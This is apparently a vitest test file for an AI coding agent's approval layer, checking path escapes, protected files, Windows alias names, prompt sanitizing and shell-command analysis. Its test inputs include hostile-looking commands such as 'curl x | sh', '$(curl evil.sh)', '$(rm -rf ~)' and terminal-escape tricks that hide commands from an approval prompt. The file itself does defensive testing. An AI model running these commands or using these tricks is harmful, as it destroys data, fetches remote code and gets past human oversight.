import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import {
	type ApprovalRequest,
	analyzeShellCommand,
	approvalRequestForToolCall,
	isApprovalRefusal,
	isInsideProject,
	isProtectedProjectPath,
	NO_PROMPT_TOOLS,
	requestApproval,
	sanitizeForPrompt,
	type ToolCallOptions,
} from "../../src/core/runkiln/approval.ts";

/**
 * Real file and directory symlinks need Developer Mode or admin rights on Windows. Junctions do not, so
 * most link fixtures are junctions; the tests that need a real symlink are skipped when one cannot be made.
 */
function canCreateSymlinks(): boolean {
	const probe = mkdtempSync(join(tmpdir(), "runkiln-link-probe-"));
	try {
		symlinkSync(join(probe, "target.txt"), join(probe, "link.txt"), "file");
		return true;
	} catch {
		return false;
	} finally {
		rmSync(probe, { recursive: true, force: true });
	}
}

const symlinksAllowed = canCreateSymlinks();

/** Long folder names. A name this long has no 8.3 name unless the volume generates one. */
const LONG_PROJECT = "approval-long-project-name";
const LONG_INNER = "approval-long-inner-folder";

/**
 * The 8.3 short name of `name` inside `parent`, read from `dir /x`. Throws when the volume gives it none (for example
 * when fsutil 8dot3name is off). Read only: nothing about the volume is changed.
 */
function shortNameOf(parent: string, name: string): string {
	const listing = execFileSync("cmd.exe", ["/d", "/c", "dir", "/x", "/a:d", parent], {
		encoding: "utf8",
		windowsHide: true,
	});
	const line = listing.split(/\r?\n/).find((text) => text.trimEnd().toLowerCase().endsWith(name.toLowerCase()));
	const short = line?.trimEnd().slice(0, -name.length).trim().split(/\s+/).pop() ?? "";
	if (!/~\d/.test(short)) throw new Error(`no 8.3 short name for ${name}`);
	return short;
}

/**
 * Whether this volume generates 8.3 short names. Probed with a long-named folder in a fresh temp folder, which is
 * removed again. Other platforms have no 8.3 names to test.
 */
function volumeHasShortNames(): boolean {
	if (process.platform !== "win32") return false;
	const probe = mkdtempSync(join(tmpdir(), "runkiln-83-probe-"));
	try {
		mkdirSync(join(probe, LONG_PROJECT));
		shortNameOf(probe, LONG_PROJECT);
		return true;
	} catch {
		return false;
	} finally {
		rmSync(probe, { recursive: true, force: true });
	}
}

const shortNamesAllowed = volumeHasShortNames();

/** Unicode characters written by code point, so this file stays plain ASCII. */
const char = (code: number) => String.fromCharCode(code);
const RLO = char(0x202e); // right-to-left override
const NEL = char(0x85); // C1 control
const ZWSP = char(0x200b); // zero-width space

/** True when the text holds a raw ESC, CR, bidi override or C1 control. */
function hasRawUnsafeChar(text: string): boolean {
	return [...text].some((ch) => {
		const code = ch.codePointAt(0) ?? 0;
		return code === 0x1b || code === 0x0d || (code >= 0x202a && code <= 0x202e) || (code >= 0x80 && code <= 0x9f);
	});
}

let base: string;
let project: string;
let outside: string;
let shortProject: string;

beforeAll(() => {
	base = mkdtempSync(join(tmpdir(), "runkiln-approval-"));
	project = join(base, "project");
	outside = join(base, "outside");
	mkdirSync(join(project, "src"), { recursive: true });
	mkdirSync(join(project, ".git", "hooks"), { recursive: true });
	mkdirSync(outside, { recursive: true });
	mkdirSync(join(project, "short~1"), { recursive: true }); // a short-name folder below the project
	shortProject = join(base, "JOHNSO~1", "proj"); // a project folder whose own path has a short name
	mkdirSync(join(shortProject, "src"), { recursive: true });
	writeFileSync(join(project, "src", "a.ts"), "x");
	writeFileSync(join(project, "package.json"), "{}");
	writeFileSync(join(outside, "target.txt"), "x");

	// Junctions use the "junction" type: they work on Windows without admin rights and are ignored elsewhere.
	symlinkSync(outside, join(project, "escape"), "junction"); // folder link out of the project
	symlinkSync(outside, join(project, "dir"), "junction"); // folder link out, used with a new file
	symlinkSync(join(outside, "missing-dir"), join(project, "gone"), "junction"); // dangling folder link out
	symlinkSync(join(project, "src"), join(project, "inlink"), "junction"); // folder link back inside
	symlinkSync(join(project, ".git", "hooks"), join(project, "hooks-link"), "junction"); // into a protected folder
	symlinkSync(join(project, "loop-b"), join(project, "loop-a"), "junction"); // two links that loop
	symlinkSync(join(project, "loop-a"), join(project, "loop-b"), "junction");
	symlinkSync(join(project, "short~1"), join(project, "short-link"), "junction"); // real target below has a 8.3 name

	if (symlinksAllowed) {
		symlinkSync(join(outside, "target.txt"), join(project, "file-link.txt"), "file");
		symlinkSync(join(outside, "notes.txt"), join(project, "notes.txt"), "file"); // dangling file link out
		// File link to a protected file.
		symlinkSync(join(project, "package.json"), join(project, "pkg-link.json"), "file");
		symlinkSync("../outside", join(project, "rel-out"), "dir"); // relative link out
		symlinkSync("src", join(project, "rel-in"), "dir"); // relative link back inside
	}
});

afterAll(() => {
	rmSync(base, { recursive: true, force: true });
});

/** The options for the tool that runs in a default session: the genuine built-in. */
const BUILTIN: ToolCallOptions = { builtin: true };

/** The approval a tool call needs: an ask, or undefined when it runs. A refusal fails the test. */
function outcomeOf(toolName: string, args: unknown): ApprovalRequest | undefined {
	const outcome = approvalRequestForToolCall(toolName, args, project, BUILTIN);
	expect(isApprovalRefusal(outcome)).toBe(false);
	return outcome as ApprovalRequest | undefined;
}

/** The approval a write to `path` needs: an ask, or undefined when it runs. */
function needsApproval(path: string): ApprovalRequest | undefined {
	return outcomeOf("write", { path, content: "x" });
}

/** The request for a tool call that must ask. Anything else fails the test. */
function requestFor(toolName: string, args: unknown, options: ToolCallOptions = BUILTIN): ApprovalRequest {
	const outcome = approvalRequestForToolCall(toolName, args, project, options);
	if (outcome === undefined || isApprovalRefusal(outcome)) throw new Error(`${toolName} did not ask`);
	return outcome;
}

/** Why a write to `path` in the folder `cwd` is refused, or undefined when it is not refused. */
function refusalReasonIn(cwd: string, path: string): string | undefined {
	const outcome = approvalRequestForToolCall("write", { path, content: "x" }, cwd, BUILTIN);
	return isApprovalRefusal(outcome) ? outcome.reason : undefined;
}

/** Why a write to `path` in the project is refused, or undefined when it is not refused. */
function refusalReason(path: string): string | undefined {
	return refusalReasonIn(project, path);
}

describe("write approval", () => {
	it("allows writes inside the project", () => {
		expect(needsApproval("src/a.ts")).toBeUndefined();
		expect(needsApproval("new/dir/file.ts")).toBeUndefined();
		expect(needsApproval(join(project, "src", "b.ts"))).toBeUndefined();
		expect(needsApproval("src/../src/c.ts")).toBeUndefined();
	});

	it("asks for .. that leaves the project", () => {
		expect(needsApproval("../outside/x.txt")).toBeDefined();
		expect(needsApproval("src/../../outside/x.txt")).toBeDefined();
		expect(needsApproval("@../x.txt")).toBeDefined();
	});

	it("asks for absolute paths outside the project", () => {
		expect(needsApproval(join(outside, "x.txt"))).toBeDefined();
		expect(needsApproval("~/runkiln-approval-test.txt")).toBeDefined();
	});

	it("asks for links inside the project that point outside", () => {
		expect(needsApproval("escape/x.txt")).toBeDefined();
		expect(needsApproval("escape/deeper/new.txt")).toBeDefined();
		const request = needsApproval("escape/x.txt");
		expect(request?.message).toContain("resolves to");
	});

	it("asks for a folder link out of the project when the file does not exist yet", () => {
		const request = needsApproval("dir/new.txt");
		expect(request).toBeDefined();
		expect(request?.message).toContain("resolves to");
		expect(request?.message).toContain(join(outside, "new.txt"));
	});

	it("asks for a dangling folder link whose target does not exist", () => {
		const request = needsApproval("gone/a.txt");
		expect(request).toBeDefined();
		expect(request?.message).toContain(join(outside, "missing-dir", "a.txt"));
	});

	it("asks for a dangling link when it is the file being written", () => {
		expect(needsApproval("gone")).toBeDefined();
	});

	// The file-link and relative-link cases need real symlinks, which Windows only allows with Developer
	// Mode or admin rights. They are skipped (not passed) where those cannot be created.
	it.skipIf(!symlinksAllowed)("asks for a dangling file link whose target does not exist", () => {
		expect(needsApproval("notes.txt")).toBeDefined();
	});

	it.skipIf(!symlinksAllowed)("asks for a file link that points outside the project", () => {
		expect(needsApproval("file-link.txt")).toBeDefined();
	});

	it.skipIf(!symlinksAllowed)("asks for a relative link that climbs out of the project", () => {
		expect(needsApproval("rel-out/new.txt")).toBeDefined();
	});

	it("allows links that point back inside the project", () => {
		expect(needsApproval("inlink/b.ts")).toBeUndefined();
		expect(needsApproval("inlink/new/file.ts")).toBeUndefined();
	});

	it.skipIf(!symlinksAllowed)("allows a relative link that points back inside the project", () => {
		expect(needsApproval("rel-in/b.ts")).toBeUndefined();
	});

	it("asks when links loop", () => {
		expect(needsApproval("loop-a/x.txt")).toBeDefined();
	});

	it("asks for an empty path", () => {
		expect(needsApproval("")).toBeDefined();
	});

	it("applies the same rules to edit", () => {
		expect(approvalRequestForToolCall("edit", { path: "src/a.ts", edits: [] }, project, BUILTIN)).toBeUndefined();
		expect(
			approvalRequestForToolCall("edit", { path: "../outside/target.txt", edits: [] }, project, BUILTIN),
		).toBeDefined();
	});

	it("never asks for the built-in read-only tools", () => {
		expect(approvalRequestForToolCall("read", { path: "../outside/target.txt" }, project, BUILTIN)).toBeUndefined();
		expect(approvalRequestForToolCall("grep", { pattern: "x", path: "/" }, project, BUILTIN)).toBeUndefined();
	});

	it("treats the root itself as inside and siblings with a shared prefix as outside", () => {
		expect(isInsideProject(project, project)).toBe(true);
		expect(isInsideProject(`${project}-sibling`, project)).toBe(false);
	});

	it.skipIf(process.platform !== "win32")("treats a project path that differs only in letter case as inside", () => {
		const upper = project.toUpperCase();
		expect(isInsideProject(join(upper, "src", "a.ts"), project)).toBe(true);
		expect(isInsideProject(join(project, "src", "a.ts"), upper)).toBe(true);
		expect(approvalRequestForToolCall("write", { path: "src/a.ts", content: "x" }, upper, BUILTIN)).toBeUndefined();
		expect(
			approvalRequestForToolCall("write", { path: join(upper, "src", "a.ts"), content: "x" }, project, BUILTIN),
		).toBeUndefined();
		expect(
			approvalRequestForToolCall("write", { path: join(project, "src", "a.ts"), content: "x" }, upper, BUILTIN),
		).toBeUndefined();
	});
});

describe("Windows alias names", () => {
	it("refuses a trailing dot with the reason as written", () => {
		expect(refusalReason("package.json.")).toBe(
			'Refused: path segment "package.json." ends in a dot; ' +
				"Windows would write a different file than the one named.",
		);
	});

	it.each([
		["package.json ", "ends in a space"],
		["package.json::$DATA", "contains a colon"],
		["PACKAG~1.JSO", "8.3 short name"],
		["src./a.ts", 'path segment "src."'],
		["a:b/c.txt", "contains a colon"],
		["src/C:/a.txt", "contains a colon"],
		["C:foo.txt", "contains a colon after a drive letter"],
		["src/SHORT~1/a.ts", "8.3 short name"],
	])("refuses %s without asking", (path, reason) => {
		expect(refusalReason(path)).toContain(reason);
	});

	it("refuses an edit the same way", () => {
		const outcome = approvalRequestForToolCall("edit", { path: "package.json.", edits: [] }, project, BUILTIN);
		expect(isApprovalRefusal(outcome)).toBe(true);
	});

	it("refuses before asking about a path outside the project", () => {
		expect(refusalReason("../outside/package.json.")).toContain("ends in a dot");
	});

	it("refuses a link inside the project whose real target below the project has a short name", () => {
		expect(refusalReason("short-link/a.txt")).toContain("8.3 short name");
	});

	it("checks short names in a relative path that climbs out of the project", () => {
		expect(refusalReason("../SHORT~1/x.txt")).toContain("8.3 short name");
		expect(refusalReason("src/../OTHER~1/x.txt")).toContain("8.3 short name");
	});

	it("still checks a short name that a later .. cancels, because it was written", () => {
		expect(refusalReason("SHORT~1/../src/a.ts")).toContain("8.3 short name");
	});

	it("refuses an absolute path outside the project that has a short name, instead of asking", () => {
		expect(refusalReason(join(base, "OTHER~1", "x.txt"))).toContain("8.3 short name");
	});

	it("refuses a hooks write that reaches the project through a short-spelled ancestor, instead of asking", () => {
		// PROJEC~1 spells the project folder, but as written the path is outside it, so every name is checked.
		expect(refusalReason(join(base, "PROJEC~1", ".git", "hooks", "pre-commit"))).toContain("8.3 short name");
		expect(refusalReason(join(base, "PROJEC~1", "src", "a.ts"))).toContain("8.3 short name");
	});

	it("allows normal writes in a project folder whose own path contains a short name", () => {
		expect(refusalReasonIn(shortProject, "src/a.ts")).toBeUndefined();
		expect(refusalReasonIn(shortProject, join(shortProject, "src", "new.ts"))).toBeUndefined();
	});

	it("allows the absolute form of src/a.ts in such a project folder", () => {
		const request = approvalRequestForToolCall(
			"write",
			{ path: join(shortProject, "src", "a.ts"), content: "x" },
			shortProject,
			BUILTIN,
		);
		expect(request).toBeUndefined();
	});

	it("still refuses a short name inside a project folder whose own path contains one, relative or absolute", () => {
		expect(refusalReasonIn(shortProject, "PACKAG~1.JSO")).toContain("8.3 short name");
		expect(refusalReasonIn(shortProject, "src/PACKAG~1.JSO")).toContain("8.3 short name");
		expect(refusalReasonIn(shortProject, join(shortProject, "PACKAG~1.JSO"))).toContain("8.3 short name");
		expect(refusalReasonIn(shortProject, join(shortProject, "src", "PACKAG~1.JSO"))).toContain("8.3 short name");
	});

	it.each([
		["nul", "is a Windows device name"],
		["CON.txt", "is a Windows device name"],
		["com1.json", "is a Windows device name"],
		["aux.tar.gz", "is a Windows device name"],
		["lpt9.log", "is a Windows device name"],
		["src/Nul.ts", "is a Windows device name"],
		["src/deep/PRN", "is a Windows device name"],
	])("refuses %s, a device name at any depth, without asking", (path, reason) => {
		expect(refusalReason(path)).toContain(reason);
	});

	it("gives the device name reason as written", () => {
		expect(refusalReason("CON.txt")).toBe(
			'Refused: path segment "CON.txt" is a Windows device name; writing to it would not create a file.',
		);
	});

	it.each(["console.txt", "nulls.ts", "COM10.txt", "LPT0", "com.json", "auxiliary/a.ts", "CONFIG"])(
		"does not refuse %s, which only looks like a device name",
		(path) => {
			expect(refusalReason(path)).toBeUndefined();
		},
	);

	it("checks device names in full paths, not only below the project folder", () => {
		expect(refusalReason("../nul.txt")).toContain("device name");
		expect(refusalReason(join(outside, "AUX.log"))).toContain("device name");
	});

	it("does not refuse normal paths, dot segments or an absolute path with a drive letter", () => {
		expect(refusalReason("./src/a.ts")).toBeUndefined();
		expect(refusalReason("src/../src/a.ts")).toBeUndefined();
		expect(refusalReason("src/./a.ts")).toBeUndefined();
		expect(refusalReason("../outside/x.txt")).toBeUndefined();
		expect(refusalReason(join(project, "src", "b.ts"))).toBeUndefined();
	});
});

/** A project folder and a folder inside it, both with long names, and the 8.3 names the volume gave them. */
interface EightThreeFixture {
	base: string;
	project: string;
	projectShort: string;
	innerShort: string;
}

describe("8.3 short names on the volume", () => {
	let made: EightThreeFixture | undefined;

	beforeAll(() => {
		if (!shortNamesAllowed) return;
		const base = mkdtempSync(join(tmpdir(), "runkiln-83-"));
		const project = join(base, LONG_PROJECT);
		mkdirSync(join(project, "src"), { recursive: true });
		mkdirSync(join(project, LONG_INNER), { recursive: true });
		writeFileSync(join(project, "src", "a.ts"), "x");
		made = {
			base,
			project,
			projectShort: shortNameOf(base, LONG_PROJECT),
			innerShort: shortNameOf(project, LONG_INNER),
		};
	});

	afterAll(() => {
		if (made) rmSync(made.base, { recursive: true, force: true });
	});

	/** The fixture from beforeAll. Only the tests that are not skipped call it. */
	function fixture(): EightThreeFixture {
		if (!made) throw new Error("the 8.3 fixture was not made");
		return made;
	}

	it.skipIf(!shortNamesAllowed)("refuses a write through the 8.3 short name of a folder inside the project", () => {
		const { project, innerShort } = fixture();
		expect(refusalReasonIn(project, `${innerShort}/a.ts`)).toContain("8.3 short name");
		expect(refusalReasonIn(project, join(project, innerShort, "a.ts"))).toContain("8.3 short name");
	});

	it.skipIf(!shortNamesAllowed)("refuses an absolute write that reaches the project through its short name", () => {
		const { base, project, projectShort } = fixture();
		expect(refusalReasonIn(project, join(base, projectShort, "src", "a.ts"))).toContain("8.3 short name");
	});

	it.skipIf(!shortNamesAllowed)("reads the short-form project path as inside the project once canonicalized", () => {
		const { base, project, projectShort } = fixture();
		const shortForm = join(base, projectShort);
		expect(isInsideProject(shortForm, project)).toBe(true);
		expect(isInsideProject(join(shortForm, "src", "a.ts"), project)).toBe(true);
		expect(isInsideProject(base, project)).toBe(false);
	});
});

describe("other tools", () => {
	it("asks for a tool outside the built-in set and shows its name and arguments", () => {
		const request = requestFor("apply_patch", { patch: "*** Update File: src/a.ts" });
		expect(request.title).toBe("Allow apply_patch?");
		expect(request.message).toContain("apply_patch");
		expect(request.message).toContain("src/a.ts");
	});

	it("asks for MCP tools even when their arguments name project files", () => {
		const request = requestFor("mcp__fs__write_file", { path: "src/a.ts", content: "x" });
		expect(request.title).toBe("Allow mcp__fs__write_file?");
		// MCP arguments are shown as compact JSON.
		expect(request.message).toContain('"path":"src/a.ts"');
	});

	it.each(["Read", "READ", "Grep", "LS", "Find", "read_file", "readonly"])("asks for %s", (name) => {
		requestFor(name, { path: "src/a.ts" });
	});

	it("runs the built-in read, grep, find and ls without asking, whatever their arguments", () => {
		for (const name of ["read", "grep", "find", "ls"]) {
			expect(
				approvalRequestForToolCall(name, { path: "../../../etc", pattern: "x" }, project, BUILTIN),
			).toBeUndefined();
		}
	});

	it("asks for read, grep, find and ls when the tool that runs is not known to be the built-in", () => {
		for (const name of ["read", "grep", "find", "ls"]) {
			expect(approvalRequestForToolCall(name, { path: "src/a.ts" }, project)).toBeDefined();
		}
	});

	it("keeps the no-prompt list fixed", () => {
		expect([...NO_PROMPT_TOOLS]).toEqual(["read", "grep", "find", "ls", "repo_map"]);
		expect(Object.isFrozen(NO_PROMPT_TOOLS)).toBe(true);
	});

	it("does not let a tool mark itself read-only", () => {
		requestFor("custom_tool", { readOnly: true, annotations: { readOnlyHint: true } });
	});

	it("sanitizes the tool name and the arguments in the prompt", () => {
		const request = requestFor(`apply\x1b[31m_patch`, { text: "a\rb\x1b[2K", note: `c${RLO}d`, nl: "x\ny" });
		expect(request.title).toBe("Allow apply_patch?");
		expect(hasRawUnsafeChar(`${request.title}\n${request.message}`)).toBe(false);
		expect(request.message).toContain("\\r");
		expect(request.message).toContain("\\u202e");
		expect(request.message).toContain("x\\ny");
	});

	it("shows circular and bigint arguments without failing", () => {
		const loop: Record<string, unknown> = { name: "loop" };
		loop.self = loop;
		const request = requestFor("apply_patch", { loop, count: 10n });
		expect(request.message).toContain("Circular");
		expect(request.message).toContain("10n");
	});

	it("caps very long arguments with a note on what is left out", () => {
		const request = requestFor("apply_patch", { text: "x".repeat(10_000) });
		expect(request.message).toMatch(/\.\.\. \(\d+ more characters\)$/);
		expect(request.message.length).toBeLessThan(4_200);
	});

	it("shows undefined arguments", () => {
		expect(requestFor("apply_patch", undefined).message).toContain("undefined");
	});
});

describe("name shadowing", () => {
	it.each(["read", "grep", "find", "ls"])("asks for a replacement %s with the default options", (name) => {
		expect(requestFor(name, { path: "src/a.ts" }, {}).title).toBe(`Allow ${name}?`);
	});

	it("says a replacement replaces a built-in tool, and shows its arguments", () => {
		const request = requestFor("read", { path: "src/a.ts" }, { replacesBuiltin: true });
		expect(request.title).toBe("Allow read (replaces a built-in tool)?");
		expect(request.message).toContain("replaces the built-in read tool");
		expect(request.message).toContain("src/a.ts");
	});

	it("asks for a replacement write or edit, even for a path inside the project", () => {
		expect(requestFor("write", { path: "src/a.ts", content: "x" }, {}).title).toBe("Allow write?");
		expect(requestFor("edit", { path: "src/a.ts", edits: [] }, {}).title).toBe("Allow edit?");
		expect(requestFor("write", { path: "src/a.ts", content: "x" }, { replacesBuiltin: true }).title).toBe(
			"Allow write (replaces a built-in tool)?",
		);
	});

	it("asks, rather than refusing, for a replacement write to a Windows alias name", () => {
		expect(requestFor("write", { path: "package.json." }, {}).title).toBe("Allow write?");
	});

	it("keeps bash and powershell asking, built-in or not", () => {
		expect(requestFor("bash", { command: "ls" }, {}).title).toBe("Run bash command?");
		expect(requestFor("powershell", { command: "Get-ChildItem" }, {}).title).toBe("Run powershell command?");
	});
});

describe("protected project files", () => {
	it("asks before writing git hooks", () => {
		const request = requestFor("write", { path: ".git/hooks/pre-commit", content: "x" });
		expect(request.title).toContain("protected file");
		expect(request.message).toContain("Git hooks");
		expect(request.message).toContain(project);
	});

	it.each([
		".git/config",
		".git/hooks/pre-commit",
		"nested/deeper/.git/config",
		"src/.git",
		".GIT/config",
		".husky/pre-commit",
		"tools/.husky/pre-commit",
		".npmrc",
		"packages/app/.npmrc",
		".github/workflows/ci.yml",
		"app/.github/workflows/release.yml",
		"AGENTS.md",
		"docs/AGENTS.md",
		"agents.md",
		"CLAUDE.md",
		"apps/web/CLAUDE.md",
		".cursor/rules/style.mdc",
		".claude/settings.json",
		"app/.claude/settings.local.json",
		".envrc",
		"sub/.envrc",
		".vscode/settings.json",
		".vscode/tasks.json",
		"tools/.vscode/tasks.json",
		"package.json",
		"packages/x/package.json",
		"Package.JSON",
	])("asks before writing %s", (path) => {
		expect(needsApproval(path)).toBeDefined();
	});

	it("says why a protected file needs a yes", () => {
		expect(needsApproval(".husky/pre-commit")?.message).toContain("Husky hooks");
		expect(needsApproval("app/.github/workflows/release.yml")?.message).toContain("Workflow files");
		expect(needsApproval("apps/web/CLAUDE.md")?.message).toContain("CLAUDE.md");
	});

	it("asks when a link inside the project resolves to a protected folder", () => {
		// The lexical path (hooks-link/pre-commit) is not protected; the real path (.git/hooks/pre-commit) is.
		expect(needsApproval("hooks-link/pre-commit")).toBeDefined();
	});

	it.skipIf(!symlinksAllowed)("asks when a file link inside the project resolves to package.json", () => {
		expect(needsApproval("pkg-link.json")).toBeDefined();
	});

	it.each(["src/a.ts", "packages.json", ".github/README.md", "docs/AGENTS.md.bak", ".gitignore"])(
		"does not ask before writing %s",
		(path) => {
			expect(needsApproval(path)).toBeUndefined();
		},
	);

	it("matches protected names case-insensitively", () => {
		expect(needsApproval("agents.md")).toBeDefined();
		expect(isProtectedProjectPath("PACKAGE.JSON")).toBe(true);
	});

	it("classifies project-relative paths", () => {
		expect(isProtectedProjectPath(".git/hooks/post-commit")).toBe(true);
		expect(isProtectedProjectPath(".git/config")).toBe(true);
		expect(isProtectedProjectPath("app/package.json")).toBe(true);
		expect(isProtectedProjectPath("app/.vscode/tasks.json")).toBe(true);
		expect(isProtectedProjectPath("AGENTS.md")).toBe(true);
		expect(isProtectedProjectPath("packages.json")).toBe(false);
		expect(isProtectedProjectPath("docs/AGENTS.md.bak")).toBe(false);
		expect(isProtectedProjectPath("src/a.ts")).toBe(false);
		expect(isProtectedProjectPath("Makefile")).toBe(true);
		expect(isProtectedProjectPath("docs/Makefile.md")).toBe(false);
	});
});

describe("prompt text sanitizing", () => {
	it("removes ANSI sequences and shows carriage returns, bidi and C1 characters as escapes", () => {
		const request = outcomeOf("bash", { command: `echo ok\x1b[2K\x1b[1A\rrm -rf build${RLO} ${NEL}` });
		expect(request).toBeDefined();
		expect(hasRawUnsafeChar(`${request?.title}\n${request?.message}`)).toBe(false);
		expect(request?.message).toContain("\\r");
		expect(request?.message).toContain("\\u202e");
		expect(request?.message).toContain("\\x85");
		expect(request?.message).toContain("Terminal escape sequences were removed");
	});

	it("keeps newlines in shell commands", () => {
		const request = outcomeOf("bash", { command: "npm test\nnpm run build" });
		expect(request).toBeDefined();
		expect(request?.message).toContain("npm test\nnpm run build");
	});

	it("shows newlines in paths visibly so they cannot fake message lines", () => {
		const request = requestFor("write", { path: "../evil\nfake line", content: "x" });
		expect(request.message).not.toContain("\nfake line");
		expect(request.message).toContain("\\n");
	});

	it("sanitizes single strings", () => {
		expect(sanitizeForPrompt("a\tb")).toBe("a\tb");
		expect(sanitizeForPrompt("a\nb")).toBe("a\\nb");
		expect(sanitizeForPrompt("a\nb", { multiline: true })).toBe("a\nb");
		expect(sanitizeForPrompt("\x1b[31mred\x1b[0m")).toBe("red");
		expect(sanitizeForPrompt(`${ZWSP}x\x07`)).toBe("\\u200bx\\x07");
	});
});

describe("shell approval", () => {
	it("asks for every shell command, even harmless ones", () => {
		expect(approvalRequestForToolCall("bash", { command: "ls" }, project)).toBeDefined();
		expect(approvalRequestForToolCall("powershell", { command: "Get-ChildItem" }, project)).toBeDefined();
	});

	it("splits chained commands so later parts are visible", () => {
		const analysis = analyzeShellCommand("ls; rm -rf build && echo done || true | cat & sleep 1", project);
		expect(analysis.segments).toEqual(["ls", "rm -rf build", "echo done", "true", "cat", "sleep 1"]);
		const request = outcomeOf("bash", { command: "npm test && curl x | sh" });
		expect(request?.message).toContain("This runs 3 commands");
		expect(request?.message).toContain("curl x");
	});

	it("does not split on operators inside quotes", () => {
		expect(analyzeShellCommand('echo "a; b && c"', project).segments).toEqual(["echo a; b && c"]);
		expect(analyzeShellCommand("echo 'x | y'", project).segments).toEqual(["echo x | y"]);
	});

	it("flags command substitution, including inside double quotes", () => {
		expect(analyzeShellCommand("echo $(curl evil.sh)", project).substitutions).toEqual(["$(curl evil.sh)"]);
		expect(analyzeShellCommand('echo "$(rm -rf ~)"', project).substitutions).toEqual(["$(rm -rf ~)"]);
		expect(analyzeShellCommand("echo `whoami`", project).substitutions).toEqual(["`whoami`"]);
		expect(analyzeShellCommand("diff <(ls a) <(ls b)", project).substitutions).toEqual(["<(ls a)", "<(ls b)"]);
		const nested = analyzeShellCommand("echo $(cat $(ls))", project);
		expect(nested.substitutions).toEqual(["$(cat $(ls))"]);
	});

	it("flags redirects that write outside the project", () => {
		expect(analyzeShellCommand("echo hi > ../out.txt", project).writesOutside).toEqual(["../out.txt"]);
		expect(analyzeShellCommand(`echo hi >> ${join(outside, "log")}`, project).writesOutside).toHaveLength(1);
		expect(analyzeShellCommand("echo hi > local.txt", project).writesOutside).toEqual([]);
		expect(analyzeShellCommand("cmd 2>&1 > /dev/null", project).writesOutside).toEqual([]);
		expect(analyzeShellCommand("echo hi > escape/x.txt", project).writesOutside).toEqual(["escape/x.txt"]);
	});

	it("flags path arguments outside the project", () => {
		const analysis = analyzeShellCommand(`cat ../secret ${join(outside, "target.txt")} src/a.ts`, project);
		expect(analysis.pathsOutside).toEqual(["../secret", join(outside, "target.txt")]);
	});
});

describe("requestApproval", () => {
	const request = { title: "t", message: "m" };

	it("denies without a UI", async () => {
		expect(await requestApproval(undefined, request)).toBe(false);
		expect(await requestApproval({ hasUI: false, confirm: async () => true }, request)).toBe(false);
	});

	it("denies when the user declines, dismisses, or the dialog fails", async () => {
		expect(await requestApproval({ hasUI: true, confirm: async () => false }, request)).toBe(false);
		expect(
			await requestApproval(
				{
					hasUI: true,
					confirm: async () => {
						throw new Error("closed");
					},
				},
				request,
			),
		).toBe(false);
	});

	it("denies on timeout and passes the timeout to the dialog", async () => {
		let seenTimeout: number | undefined;
		const approved = await requestApproval(
			{
				hasUI: true,
				confirm: async (_title, _message, opts) => {
					seenTimeout = opts?.timeout;
					return false; // what the dialog resolves to when it times out
				},
			},
			request,
			{ timeoutMs: 5 },
		);
		expect(approved).toBe(false);
		expect(seenTimeout).toBe(5);
	});

	it("denies when the turn was aborted", async () => {
		const controller = new AbortController();
		controller.abort();
		const approved = await requestApproval({ hasUI: true, confirm: async () => true }, request, {
			signal: controller.signal,
		});
		expect(approved).toBe(false);
	});

	it("allows only an explicit yes", async () => {
		expect(await requestApproval({ hasUI: true, confirm: async () => true }, request)).toBe(true);
	});
});
